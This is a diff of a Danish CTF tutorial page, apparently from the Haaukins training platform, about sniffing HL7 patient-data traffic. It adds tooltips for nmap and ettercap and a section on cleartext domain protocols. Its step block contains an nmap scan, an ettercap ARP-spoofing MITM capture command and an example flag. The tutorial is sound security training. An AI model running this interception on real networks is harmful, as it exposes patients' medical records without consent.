@@ -28,8 +28,8 @@
              <code>^</code> (<code>MSH</code>, <code>PID</code>, <code>OBR</code>, <code>OBX</code> …), så en MITM kan
              læse hele journalen.</p>
 <h2>Trin for trin</h2>
-<pre><code>sudo nmap -Pn -p2575 --open &lt;subnet&gt;/24      # find HL7-serveren
-sudo ettercap -T -q -i eth0 -M arp:remote -w /tmp/hl7.pcap /&lt;server&gt;// ///
+<pre><code>sudo <span class="gloss" tabindex="0" data-tip="Netværksscanner — finder åbne porte og services på en host.">nmap</span> -Pn -p2575 --open &lt;subnet&gt;/24      # find HL7-serveren
+sudo <span class="gloss" tabindex="0" data-tip="ARP-spoofing/MITM-værktøj til at opsnappe trafik på et lokalt netværk.">ettercap</span> -T -q -i eth0 -M arp:remote -w /tmp/hl7.pcap /&lt;server&gt;// ///
 # tekst-protokol -> ofte nok:
 strings /tmp/hl7.pcap | grep -aoiE '(HKN|DDC)\{[^}]*\}'</code></pre>
 <details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
@@ -37,7 +37,13 @@ strings /tmp/hl7.pcap | grep -aoiE '(HKN|DDC)\{[^}]*\}'</code></pre>
         <p>Flag (eksempel): <span class="flag">HKN{6p-eWi-CAk95}</span></p>
 </details>
 <h2>Hvad du har lært</h2>
-<ul><li>"Et meget normalt protokol" til patientdata = HL7 (ofte MLLP/2575). Ukendt port? Scan efter den.</li><li>Tekst-protokoller kan ofte løses med <code>strings | grep</code> før du dykker i segmenterne.</li><li>Samme MITM-teknik virker uanset protokol — kun hvor flaget gemmer sig ændrer sig.</li></ul>
+<ul><li>"Et meget normalt protokol" til patientdata = HL7 (ofte MLLP/2575). Ukendt port? Scan efter den.</li><li>Tekst-protokoller kan ofte løses med <code>strings | grep</code> før du dykker i segmenterne.</li><li>Samme MITM-teknik virker uanset protokol, kun hvor flaget gemmer sig ændrer sig.</li></ul>
+<h2>Hvor ses dette igen?</h2>
+<p>Domæne-specifikke protokoller (HL7 til sundhed, Modbus/DNP3 til industri, FIX til finans,
+OCPP til ladestandere) virker ofte eksotiske, men de fleste er bare struktureret klartekst over
+TCP. Lad dig ikke skræmme af et ukendt navn: find porten, dump trafikken, og se om det er
+læsbart. Er det tekst, er <code>strings | grep</code> et helt legitimt første skridt, uanset hvor
+specialiseret protokollen lyder.</p>
 <footer>
 Del af <a href="index.html">Haaukins CTF-tutorials</a>. <a href="https://www.haaukins.dk/" target="_blank">Haaukins</a>
 er en dansk undervisningsplatform til sikkerhedstræning (AAU / De Danske Cybermesterskaber) — alle opgaver
